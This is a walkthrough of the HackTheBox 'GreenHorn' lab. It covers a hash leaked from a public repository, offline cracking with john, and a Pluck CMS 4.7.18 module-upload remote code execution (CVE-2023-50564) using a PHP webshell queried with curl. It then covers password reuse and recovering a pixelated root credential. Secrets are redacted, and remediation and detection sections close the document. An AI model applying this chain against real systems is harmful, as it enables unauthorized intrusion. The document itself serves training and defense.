# GreenHorn — HTB Easy, Linux

**By d4rkgunn3r / Dylan Senez — Authorized laboratory assessment**

**Attack path:** Gitea-style service/3000 → public repository leaks Pluck password hash → offline SHA-512 crack → Pluck admin login → CVE-2023-50564 module upload RCE → `www-data` → password reuse to `junior` → user.txt → depixelized credential from document → `su root` → root.txt

> **Colour key:** **ATTACKER** blocks run on your host. **TARGET** blocks run inside the HTB machine once you have a shell.

### Reproducibility gaps in the retained source material

- The exact depixelization utility/command used to recover the final root credential was not preserved in the fetched notes. The source confirms the artifact-analysis result and subsequent `su root`, so this public copy does not invent that missing command.
- Recovered passwords, hashes, and flag contents are redacted.

---

## 02 — Scope

| Field | Detail |
| --- | --- |
| Machine | GreenHorn / HTB, Easy, Linux |
| Target IP (recorded run) | `10.129.231.80` |
| Hostname | `greenhorn.htb` |
| Starting access | Unauthenticated |
| Services | SSH/22, nginx/80, Gitea-style HTTP/3000 |
| Objective | Obtain user and root proof in the authorized HTB lab |

## 03 — External recon

**ATTACKER**

```bash
nmap -sV -sC 10.129.231.80
```

Confirmed services:

```text
22/tcp    OpenSSH 8.9p1
80/tcp    nginx 1.18.0
3000/tcp  Golang net/http — GreenHorn / Gitea-style cookies
```

## 04 — Public repository → password hash

Browsing the repository exposed:

```text
data/settings/pass.php
```

The file contained the Pluck administrator password hash.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha512 hash.txt
```

The recovered password is intentionally not published.

## 05 — Pluck CMS access

Authenticate at:

```text
http://greenhorn.htb/login.php
```

The retained notes identify **Pluck CMS 4.7.18**.

## 06 — CVE-2023-50564 module upload → RCE

Prepare an authenticated Pluck module ZIP containing a PHP payload:

```text
payload/
└── shell.php
```

Use:

```text
Admin → Modules → Install new module → upload payload.zip
```

Then validate:

```bash
curl 'http://greenhorn.htb/data/modules/payload/shell.php?cmd=id'
```

The retained session obtained a reverse shell as `www-data`.

## 07 — Lateral movement to junior

The Pluck credential was reused by the local `junior` account.

```bash
su junior
whoami
id
cat /home/junior/user.txt
```

Password and flag values are redacted.

## 08 — Document analysis → root

User-accessible material included a pixelated credential in a document/image. The retained notes state that depixelization recovered a root password.

Because the exact depixelization command was not preserved, this write-up stops at the confirmed artifact-analysis result rather than fabricating a tool invocation.

```bash
su root
whoami
id
cat /root/root.txt
```

## 09 — Vulnerability summary & remediation

| # | Finding | Asset | Rating |
| --- | --- | --- | --- |
| 1 | Public source repository exposes authentication material | Developer service/3000 | High |
| 2 | Pluck 4.7.18 module installer permits arbitrary PHP upload/RCE | Pluck CMS | Critical |
| 3 | Password reuse enables local lateral movement | Local accounts | High |
| 4 | Pixelation used as credential redaction is reversible | Sensitive document | High |

### Remediations

- Put source repositories in private mode and disable anonymous access.
- Remove secrets/hashes from repositories and add secret-scanning controls.
- Upgrade or replace vulnerable Pluck CMS installations.
- Block script execution in upload/module directories where possible.
- Prevent password reuse across web and local accounts.
- Never rely on pixelation/blur for secret redaction.

## 10 — Detection opportunities

- Anonymous access to sensitive repository paths.
- New PHP files written into Pluck module directories.
- Web-server processes spawning shells.
- `su junior` or `su root` shortly after web compromise.
- Downloads or access to documents containing sensitive administrative material.

## 11 — Timeline

1. Nmap identified SSH, nginx, and port 3000.
2. Gitea-style headers/cookies identified the developer platform.
3. A public repository exposed the Pluck password hash.
4. Offline cracking enabled Pluck admin access.
5. CVE-2023-50564 module upload produced code execution.
6. Password reuse enabled `su junior`; user proof was collected.
7. A pixelated document was analyzed and yielded the root credential.
8. `su root` succeeded and root proof was collected.

**Publication note:** recovered passwords, hashes, document secrets, and flag values have been removed from this shared copy.
